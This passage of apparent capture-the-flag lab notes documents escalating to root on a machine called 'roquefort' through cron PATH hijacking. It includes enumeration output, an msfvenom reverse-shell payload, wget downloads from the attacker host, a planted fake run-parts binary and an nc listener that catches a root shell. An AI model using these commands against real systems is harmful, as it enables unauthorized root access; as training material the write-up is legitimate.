[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
chloe@roquefort:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
chloe@roquefort:/tmp$ 
```

## Prior Testing (maybe other exploits worked)

```
chloe@roquefort:/tmp$ ls -al /etc/crontab
ls -al /etc/crontab
-rw-r--r-- 1 root root 723 May 11  2020 /etc/crontab
chloe@roquefort:/tmp$ test
test
chloe@roquefort:/tmp$ run-parts
run-parts
run-parts: missing operand
Try `run-parts --help' for more information.
chloe@roquefort:/tmp$ ls /usr/local/bin/run-parts
ls /usr/local/bin/run-parts
ls: cannot access '/usr/local/bin/run-parts': No such file or directory
chloe@roquefort:/tmp$ ls /usr/local/bin
ls /usr/local/bin
gitea
chloe@roquefort:/tmp$ ls /usr/local/sbin
ls /usr/local/sbin
chloe@roquefort:/tmp$ wget 192.168.49.90:3000/shell
wget 192.168.49.90:3000/shell
--2022-02-14 09:46:18--  http://192.168.49.90:3000/shell
Connecting to 192.168.49.90:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 68 [application/octet-stream]
Saving to: ‘shell.1’

     0K                                                       100% 15.3M=0s

2022-02-14 09:46:19 (15.3 MB/s) - ‘shell.1’ saved [68/68]

chloe@roquefort:/tmp$ ls
ls
lse.sh
shell
shell.1
systemd-private-5fe05d4efb9d432fb9e597b60cabd797-systemd-timesyncd.service-7WN7GK
vmware-root
chloe@roquefort:/tmp$ ls -al shell*
ls -al shell*
-rw-r--r-- 1 chloe chloe  0 Feb 14 09:08 shell
-rw-r--r-- 1 chloe chloe 68 Feb 14 09:46 shell.1
chloe@roquefort:/tmp$ rm shell
rm shell
chloe@roquefort:/tmp$ cp shell.1 /usr/local/bin/run-parts
cp shell.1 /usr/local/bin/run-parts
chloe@roquefort:/tmp$ run-parts
run-parts
run-parts: missing operand
Try `run-parts --help' for more information.
chloe@roquefort:/tmp$ ./shell.1
./shell.1
bash: ./shell.1: Permission denied
chloe@roquefort:/tmp$ chmod +x /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
chloe@roquefort:/tmp$ run-parts
run-parts
run-parts: missing operand
Try `run-parts --help' for more information.
chloe@roquefort:/tmp$ chmod +x shell.1
chmod +x shell.1
chloe@roquefort:/tmp$ ./shell.1
./shell.1
bash: ./shell.1: cannot execute binary file: Exec format error
chloe@roquefort:/tmp$ uname -a
uname -a
Linux roquefort 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
chloe@roquefort:/tmp$ 
```

## Rev shell binary payload test
```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.90 LPORT=3000 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 3000                                                           
Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
192.168.90.67 - - [14/Feb/2022 09:52:18] "GET /shell HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 3000                                                                         
listening on [any] 3000 ...
connect to [192.168.49.90] from (UNKNOWN) [192.168.90.67] 53888
whoami
chloe
exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
chloe@roquefort:/tmp$ wget 192.168.49.90:3000/shell   
wget 192.168.49.90:3000/shell
--2022-02-14 09:50:36--  http://192.168.49.90:3000/shell
Connecting to 192.168.49.90:3000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: ‘shell’

     0K                                                       100% 36.2M=0s

2022-02-14 09:50:37 (36.2 MB/s) - ‘shell’ saved [194/194]

chloe@roquefort:/tmp$ chmod +x shell
chmod +x shell
chloe@roquefort:/tmp$ ls /usr/local/bin
ls /usr/local/bin
gitea
run-parts
chloe@roquefort:/tmp$ rm /usr/local/bon/run-parts
rm /usr/local/bon/run-parts
rm: cannot remove '/usr/local/bon/run-parts': No such file or directory
chloe@roquefort:/tmp$ rm /usr/local/bin/run-parts
rm /usr/local/bin/run-parts
chloe@roquefort:/tmp$ cp shell /usr/local/bin/run-parts
cp shell /usr/local/bin/run-parts
chloe@roquefort:/tmp$ run-parts
run-parts
run-parts: missing operand
Try `run-parts --help' for more information.
chloe@roquefort:/tmp$ echo $PATH
echo $PATH
/usr/lib/git-core:/usr/lib/git-core:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
chloe@roquefort:/tmp$ /usr/local/bin/run-parts
/usr/local/bin/run-parts
chloe@roquefort:/tmp$ 
```

Just waiting for a while

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [192.168.49.90] from (UNKNOWN) [192.168.90.67] 53916
whoami
root
cd /root
ls
proof.txt
cat proof.txt
6e667b9d268206c6c411f78f2eaf0502
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.90.67  netmask 255.255.255.0  broadcast 192.168.90.255
        ether 00:50:56:ba:c0:fa  txqueuelen 1000  (Ethernet)
        RX packets 234590  bytes 17286223 (16.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 114931  bytes 189101416 (180.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 155065  bytes 133042398 (126.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155065  bytes 133042398 (126.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
hostname
roquefort
```

![](Pasted%20image%2020220214230922.png)
# Others

the exploit in the writeup didn't really work for me